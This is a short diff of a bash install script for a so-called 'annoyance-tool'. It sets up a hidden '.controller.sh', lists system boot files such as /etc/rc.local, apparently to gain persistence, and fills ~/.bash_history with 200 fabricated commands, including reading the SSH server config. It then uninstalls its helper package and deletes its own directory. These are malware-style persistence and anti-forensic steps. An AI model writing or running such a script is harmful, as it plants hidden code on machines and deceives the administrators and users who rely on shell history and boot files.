@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt-get install dos2unix -y
 chmod +x .controller.sh
-sudo dos2unix controller.sh
+sudo dos2unix .controller.sh
 LOCATIONS=("/etc/rc.local"
            "/etc/rc.d/rc.local"
            "/etc/init.d/rc.local"
@@ -72,5 +72,5 @@ for i in {1..200}; do
     10) echo "cat /etc/ssh/sshd_config";;
   esac
 done >> ~/.bash_history
-apt-get remove dos2unix
+apt-get remove dos2unix -y
 rm -rf ../annoyance-tool
